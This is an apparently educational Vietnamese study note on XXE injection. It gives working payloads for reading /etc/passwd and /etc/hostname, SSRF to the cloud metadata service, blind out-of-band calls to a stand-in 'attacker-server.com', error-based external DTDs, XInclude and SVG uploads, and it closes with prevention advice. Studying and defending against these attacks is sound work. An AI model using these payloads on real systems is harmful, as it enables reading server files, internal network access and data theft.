# XXE

Source: https://www.notion.so/32a4d37069a880a39387da85e740de02

## Tổng Quan

XXE là XML External Entity Injection. Lỗ hổng xảy ra khi ứng dụng parse XML nhưng vẫn cho phép external entity, DTD, XInclude hoặc tính năng XML nguy hiểm khác.

Hậu quả:

- Đọc file trên server như `/etc/passwd`.
- SSRF tới hệ thống nội bộ.
- Blind data exfiltration qua OOB.
- Trong một số bối cảnh có thể dẫn tới RCE.

## Classic XXE

Payload đọc file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Nếu app reflect nội dung entity trong response, nội dung file sẽ bị lộ.

## XXE SSRF

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

Dùng khi muốn server gửi request tới internal endpoint hoặc metadata service.

## Blind XXE

Khi response không hiển thị dữ liệu, có thể dùng OOB:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-server.com/log"> ]>
```

Hoặc error-based XXE với external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Hidden Attack Surface

### XInclude

Khi attacker không control toàn bộ XML document nhưng control được một data node:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### File Upload

SVG là XML, nên upload SVG có thể trigger XXE nếu server parse file:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Content-Type Switching

Một số server chấp nhận `text/xml` hoặc `application/xml` dù endpoint ban đầu dùng form-urlencoded.

## Phòng Chống

- Disable DTD và external entity resolution.
- Disable XInclude nếu không dùng.
- Không parse XML từ user input nếu không cần.
- Validate strict content type.
- Cấu hình parser an toàn theo ngôn ngữ/framework.

